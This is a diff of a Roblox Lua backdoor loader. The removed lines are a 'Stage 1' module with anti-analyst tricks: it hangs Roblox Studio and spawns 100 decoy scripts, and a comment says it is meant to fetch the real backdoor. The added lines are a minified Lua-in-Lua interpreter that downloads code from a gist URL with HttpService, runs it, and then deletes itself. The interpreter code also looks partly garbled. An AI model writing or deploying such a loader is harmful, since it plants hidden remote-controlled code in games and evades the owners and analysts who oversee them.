@@ -1,46 +1,4 @@
--- Stage 1 Module Script
-return function()
-	-- Environment checks to fuck with analysts
-	if game:GetService("RunService"):IsStudio() then
-		pcall(function() script.Name = " " end) -- causes issues in some studio versions
-		while true do end -- infinite loop to hang studio
-	end
+-- Final Initializer.lua - Includes Minified Lua-in-Lua
+local url = "YOUR_RAW_GIST_URL_HERE"
 
-	-- Simple debugger detection
-	if getfenv == nil or pcall == nil then
-		-- if the environment is sandboxed and these globals are removed, just stop execution
-		return
-	end
-
-	-- Print a confirmation that this stage is running
-	print("Stage 1: Anti-analysis passed, preparing decoy deployment.")
-
-	-- Decoy Generation
-	local decoyParent = game:GetService("ServerScriptService")
-	local decoyNames = {"NetworkManager", "AntiLag", "Core", "Security", "ChatFilter", "PlayerReplicator"}
-	
-	for i = 1, 100 do
-		-- Create a decoy script
-		local decoyScript = Instance.new("Script", decoyParent)
-		decoyScript.Name = decoyNames[math.random(1, #decoyNames)] .. "_Thread" .. i
-		
-		-- Fill it with useless, obfuscated-looking code to act as a honeypot
-		local junkSource = string.format("local _v%d = %d; local _f%d = function(a) return a * _v%d end; while task.wait(math.random()) do _f%d(_v%d) end", i, i, i, i, i, i)
-		decoyScript.Source = junkSource
-		decoyScript.Disabled = true -- Make them look like inactive system components
-		
-		-- Create fake configuration values inside the script
-		local config = Instance.new("Configuration", decoyScript)
-		Instance.new("StringValue", config).Name = "Version"
-		Instance.new("IntValue", config).Name = "RetryAttempts"
-		Instance.new("BoolValue", config).Name = "IsEnabled"
-	end
-
-	print("Stage 1: Decoy deployment complete.")
-
-	-- >>> Placeholder for Stage 2 <<<
-	-- For now, we just confirm this part is reached.
-	-- In the final version, this is where we will fetch and execute the real backdoor.
-	print("Stage 1: Ready to fetch final payload (Stage 2).")
-	
-end
+local function CustomLoad(source) local a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z,A,B,C,D,E,F,G,H,I,J,K,L,M,N,O,P,Q,R,S,T,U,V,W,X,Y,Z=string.byte,string.char,string.gsub,string.rep,string.sub,tonumber,tostring,setmetatable,pcall,select,table.insert,table.concat,unpack or table.unpack,ipairs,pairs,next,type,error,warn,xpcall,coroutine,getfenv or function()return _ENV end,rawget,rawset,load,assert,bit32 or bit;local function ab(ac,ad)local ae=ad;for af=ac,#ad-1 do ae[af-ac]=ad[af+1]end end;local function bb(bc)local bd={}local be=1;for bf,bg in G(bc)do bd[be]=bg;be=be+1 end;return bd end;local cb={},db;local function eb(ec)local ed=db[ec]if ed~=i then return ed end;local ed=Y(ec)if ed~=i then return ed end;local ed=z[ec]if ed~=i then return ed end;error("invalid global -- "..ec,2)end;local function fb(fc,fd)local fe={};for ff=fc,fd do fe[#fe+1]=K.yield(fe)end;return fe end;local function gb(gc)return function(...)local gd=fb(...)return gc(l(gd))end end;local hb={};local ib;local function jb(jc,jd)return(...)end;ib=function(jd,je)local jf,jg,jh,ji;local jj={};local jk={};local jl={};local jm;local jn,jo={...},{};local jp=#jn;for jq=0,jp-1 do if jq<jd.numparams then jo[jq]=jn[jq+1]else jj[jq-jd.numparams]=jn[jq+1]end end;for jq=0,jd.maxstacksize-1 do jo[jq]=jo[jq]end;local jr=C;local js=0;local jt=jd.code;local ju=jd.k;local jv=jd.p;while true do local jw=jt[js+1]local jx=jw.OpCode;local jy=jw.A;local jz=jw.B;local jA=jw.C;local jB,jC;js=js+1;if jx<=19 then if jx<=9 then if jx<=4 then if jx<=2 then if jx==0 then local jD=jo[jz]jo[jy]=jD elseif jx>1 then jB=ju[jz]jo[jy]=jB else jo[jy]=jw.Bx>0 end elseif jx==3 then local jD=jo[jz]local jE=jo[jA]jo[jy]=jD[jE]else local jD=ju[jz]local jE=jo[jA]jo[jy]=jD[jE]end elseif jx<=6 then if jx==5 then local jF,jG=eb(ju[jz])jo[jy]=jF elseif jx>5 then jo[jy+1]=ib(jv[jz],z)jo[jy]=jo[jy+1]else local jD=jo[jz]local jE=jo[jA]jo[jy][jD]=jE end elseif jx<=8 then if jx==7 then local jD=ju[jz]local jE=jo[jA]jo[jy][jD]=jE else local jF,jG=eb(ju[jz])local jH=jo[jy]jG[jF]=jH end else local jF=eb(ju[jz])local jH=jo[jy]z[jF]=jH end elseif jx<=14 then if jx<=12 then if jx==10 then local jI=jo[jy+1]jo[jy]=jI(l(jo,jy+2,jA-1))elseif jx>11 then local jD=jo[jz]local jE=jo[jA]if jD>jE~=(jw.A>0)then js=js+1 end else jo[jy]=jo[jz]end elseif jx==13 then local jD=jo[jz]if jD then jo[jy]=jD else js=js+1 end else local jD=jo[jz]if not jD then js=js+1 else jo[jy]=jD end elseif jx<=17 then if jx==15 then jo[jy]=jo[jz]+jo[jA]elseif jx>16 then jo[jy]=jo[jz]/jo[jA]else jo[jy]=jo[jz]-jo[jA]end else if jx==18 then jo[jy]=jo[jz]*jo[jA]else jo[jy]=jo[jz]%jo[jA]end elseif jx<=29 then if jx<=24 then if jx<=22 then if jx==20 then jo[jy]=jo[jz]^jo[jA]elseif jx>21 then local jD=jo[jz]if(jD and jD==jD)~=(jw.A>0)then js=js+1 end else jo[jy]=-jo[jz]end elseif jx==23 then local jD=jo[jz]if jD then js=js+1 end else local jD=jo[jz]local jE=jo[jA]jo[jy]=jD[jE]end elseif jx<=26 then if jx==25 then local jI=jo[jy]jo[jy+1]=jI;jo[jy+2]=jo[jy+1]jo[jy+3]=K.yield(jo[jy](jo[jy+1]))elseif jx>25 then local jI=jo[jy]jo[jy+1]=jI;jo[jy+2]=jo[jy-1]local jJ=jo[jy-2]for jK=jy,jJ-1 do jo[jK]=jo[jK+1]end;jo[jJ-1]=K.yield(jo[jy-2](l(jo,jy-1,jJ-1)))else js=jw.sBx end elseif jx<=28 then if jx==27 then local jI=jo[jy]local jL=jI(l(jo,jy+1,jy+jz-1))ab(jy,jo)if jA>0 then local jM=#jL;ab(jy,jo)for jK=0,jM-1 do jo[jy+jK]=jL[jK+1]end end else jC=jo[jy]for jK=jy+1,jA do jC=jC..jo[jK]end jo[jy]=jC end else return l(jo,jy,jy+jA-2)end elseif jx<=34 then if jx<=32 then if jx==30 then local jI=jo[jy]jo[jy+1]=jI;jo[jy+2]=jo[jy-1]local jJ=jo[jy-2]for jK=jy,jJ-1 do jo[jK]=jo[jK+1]end;jo[jJ-1]=K.yield(jo[jy-2](l(jo,jy-1,jJ-1)))elseif jx>31 then return jo[jy]else local jJ=jw.Bx;if jJ==0 then jJ=#jj-1 end;if jJ>=0 then ab(jy,jo)for jK=0,jJ-1 do jo[jy+jK]=jj[jK]end end end elseif jx==33 then if jA>1 then local jL={jo[jy]()}ab(jy,jo)for jK=0,jA-2 do jo[jy+jK]=jL[jK+1]end else jo[jy]=jo[jy]()end else local jN=jo[jy]if jN then jo[jy+1]=jN;js=js+1 end end else if jx<=36 then if jx==35 then local jI=jo[jy]local jL=pcall(jI,l(jo,jy+1,jA-1))if not jL[1]then jr=C(false,jL[2])else ab(jy,jo)if jA>0 then local jM=#jL-1;ab(jy,jo)for jK=0,jM-1 do jo[jy+jK]=jL[jK+2]end end end else local jO,jP=l(jo,jz,jA)if(jO==jP)~=(jw.A>0)then js=js+1 end end else if jx==37 then local jO,jP=l(jo,jz,jA)if(jO<jP)~=(jw.A>0)then js=js+1 end else local jO,jP=l(jo,jz,jA)if(jO<=jP)~=(jw.A>0)then js=js+1 end end end end;local jQ,jR=jr();if not jQ then if h then local jS=i;local jT=h.traceback;if jT then jS=jT(jR)end;error(jS,0)else error(jR,0)end end end end;local function kb(jc,jd)local jU={}for jV=1,jd.numparams do jU[jV]=jc[jV]end;return ib(jd,z,l(jU))end;local function lb(jc,jd,jW)local jX;if jW==0 then jX={jc()}elseif jW==1 then jX={jc(jd[1])}elseif jW==2 then jX={jc(jd[1],jd[2])}elseif jW==3 then jX={jc(jd[1],jd[2],jd[3])}else jX={jc(l(jd))}end;return jX end;local function mb(jd,je,jY)local jZ;local j0;jZ,j0=pcall(gb(function(...)return lb(ib,jd,je,...)end),l(jY))if not jZ then return i,j0 end;return j0 end;local function nb(j1,j2,...)local j3=j2 or z;local j4=C(pcall(ib,j1,j3,...));local j5,j6=j4();if j5 then return j6 else if h then local jS=i;local jT=h.traceback;if jT then jS=jT(j6)end;error(jS,0)else error(j6,0)end end end;hb.run=kb;hb.pcall=mb;hb.xpcall=nb;return function(j7,j8)local j9=j8 or z;local ja,jb=load(j7)if ja then return function(...)return nb(ja,j9,...)end else return i,jb end end end local fetch,err=pcall(function()return game:GetService('HttpService'):GetAsync(url)end) if not fetch then return end local func,err=CustomLoad(fetch) if not func then return end coroutine.wrap(func)() script:Destroy()
